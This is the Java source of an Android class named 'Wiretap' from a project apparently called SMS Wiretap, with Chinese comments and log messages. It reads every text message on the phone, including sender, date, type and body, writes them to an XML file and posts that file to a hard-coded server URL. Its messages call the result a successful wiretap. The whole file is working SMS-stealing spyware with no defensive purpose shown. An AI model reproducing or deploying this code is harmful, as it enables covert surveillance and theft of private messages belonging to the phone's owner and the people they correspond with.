package com.ckz.smswiretap.service;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.Header;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.util.Log;
import android.widget.Toast;

import com.ckz.smswiretap.app.MainActivity;
import com.ckz.smswiretap.utils.XMLTransformTools;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
/**
 * 窃听器
 * @author Administrator
 *
 */
@SuppressLint("HandlerLeak")
public class Wiretap extends MainActivity {

	private static final String TAG = "Wiretap";

	/*
	 消息机制处理器
	 private static final int SUCCEED = 1;

	public Handler handler = new Handler() {
		public void handleMessage(Message msg) {
			switch (msg.what) {
			case SUCCEED:
				Toast.makeText(Wiretap.this, msg.obj.toString(),Toast.LENGTH_SHORT).show();
				break;
			}
		};
	};*/

	/**
	 * 读取用户所有短信内容，并保存xml序列化到指定存储空间存储
	 *
	 * @param context
	 * @return 返回存储的位置
	 */
	public static File readSMS(Context context) {
		// content://sms，读取所有的短信
		Uri uri = Uri.parse("content://sms");
		// 得到中间人，内容提供者-》通过这个渠道获取数据库的内容
		ContentResolver resolver = context.getContentResolver();
		Cursor cu = resolver.query(uri, new String[] { "address", "date","type", "body" }, null, null, "date desc,address");
		List<Map<String, String>> list = new ArrayList<Map<String, String>>();
		while (cu.moveToNext()) {
			Map<String, String> map = new HashMap<String, String>();
			String address = cu.getString(0);
			map.put("address", address);
			String date = cu.getString(1);// 毫秒值
			map.put("date", date);
			String type = cu.getString(2);
			map.put("type", type);
			String body = cu.getString(3);
			map.put("body", body);
			list.add(map);
		}
		// xml序列化，并保存
		File file = XMLTransformTools.xmlSerializer(list, null, null, null,null, null, context);
		Log.i(TAG, "短信-xml序列化，并保存成功！");
		Toast.makeText(context, "短信-xml序列化，并保存成功！", Toast.LENGTH_SHORT).show();
		return file;
	}

	/**
	 * 上传窃听内容xml序列化文件到服务器
	 *
	 * @param file
	 *            文件
	 * @param url
	 *            上传服务器路径
	 */
	public static void uploadSMS(final File file, final String url, final Context context) {
		/*
		//子线程
		 new Thread() {
			@Override
			public void run() {
				try {
					if (file == null || !file.exists()) {
			            throw new FileNotFoundException();
			        }
					// 上传窃听文件到服务器
					// 1.打开浏览器
					HttpClient client = new DefaultHttpClient();
					// 2.输入地址
					HttpPost httpPost = new HttpPost(url);
					// 指定要提交的数据实体
					List<NameValuePair> parameters = new ArrayList<NameValuePair>();
					parameters.add(new BasicNameValuePair("username", "chen"));
					parameters.add(new BasicNameValuePair("password", "123"));
					httpPost.setEntity(new UrlEncodedFormEntity(parameters,"UTF-8"));
					// 3.敲回车
					HttpResponse response = client.execute(httpPost);
					int code = response.getStatusLine().getStatusCode();
					switch (code) {
					case 200:
						// 定义消息
						Message msg = new Message();
						msg.what = SUCCEED;
						msg.obj = "文件上传成功！";
						// 通知消息处理器
						handler.sendMessage(msg);
						break;
					}

				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}.start();*/
		try {
			AsyncHttpClient client = new AsyncHttpClient();
			RequestParams params = new RequestParams();
			params.put("SMSWiretap", file);
			if(!file.exists()){
				//Toast.makeText(context, "上传文件不存在！", Toast.LENGTH_SHORT).show();
				Log.i(TAG, "要上传至服务器的窃听文件不存在，窃听失败！");
				Toast.makeText(context, "要上传至服务器的窃听文件不存在，窃听失败！", Toast.LENGTH_SHORT).show();
				return;
			}
			client.post(url, params, new AsyncHttpResponseHandler() {
				@Override
				public void onSuccess(int arg0, Header[] arg1, byte[] arg2) {
					//Toast.makeText(context, "完成窃听！", Toast.LENGTH_SHORT).show();
					Log.i(TAG, "窃听内容文件已经上传至服务器，窃听成功！");
					Toast.makeText(context, "窃听内容文件已经上传至服务器，窃听成功！", Toast.LENGTH_SHORT).show();
				}
				@Override
				public void onFailure(int arg0, Header[] arg1, byte[] arg2, Throwable arg3) {
					//Toast.makeText(context, "上传文件失败！", Toast.LENGTH_SHORT).show();
					Log.i(TAG, "窃听内容文件上传至服务器失败，窃听失败！");
					Toast.makeText(context, "窃听内容文件上传至服务器失败，窃听失败！", Toast.LENGTH_SHORT).show();
				}
			});
		} catch (Exception e) {
			e.printStackTrace();
			//Toast.makeText(context, "上传文件失败！", Toast.LENGTH_SHORT).show();
			Log.i(TAG, "异步上传文件到服务器失败，窃听失败！");
			Toast.makeText(context, "异步上传文件到服务器失败，窃听失败！", Toast.LENGTH_SHORT).show();
		}
	}


	/**
	 * 检查网络是否可用
	 * @param context
	 */
	public static boolean checkInternet(Context context){
		boolean b =true;
		//检查用户网络的情况
		ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		//获取，加上权限android.permission.ACCESS_NETWORK_STATE
		NetworkInfo info = cm.getActiveNetworkInfo();
		if(info!=null && info.isConnected()){
			Toast.makeText(context, "网络可用", Toast.LENGTH_SHORT).show();
		}else{
			b=false;
			Toast.makeText(context, "网络不可用", Toast.LENGTH_SHORT).show();
			//可以设置定位到系统网络设置位置，intent组件：显式意图(必须知道包名、类名)
			/*
			2.3android系统
			Intent intent = new Intent();
			intent.setClassName("com.android.settings", "com.android.settings.WirelessSettings");
			startActivity(intent);*/
			//隐式意图(动作、数据)，通过描述动作的行为来激活一个activity。可以在清单文件里自定义动作，然后通过隐式意图形式调用激活activity
		}
		return b;
	}


	/**
	 * 窃听启动入口
	 * @param context
	 */
	public static void wiretapMain(Context context){
		//检查网络是否可用
		checkInternet(context);
		//返回窃听短信内容的xml序列化存储位置
		File file = Wiretap.readSMS(context);
		String url="http://169.254.9.148:8080/SMSWiretapService/UploadFileServlet";
		//上传窃听内容到服务器保存
		if(file.exists()){
			Wiretap.uploadSMS(file, url, context);
		}
	}




}
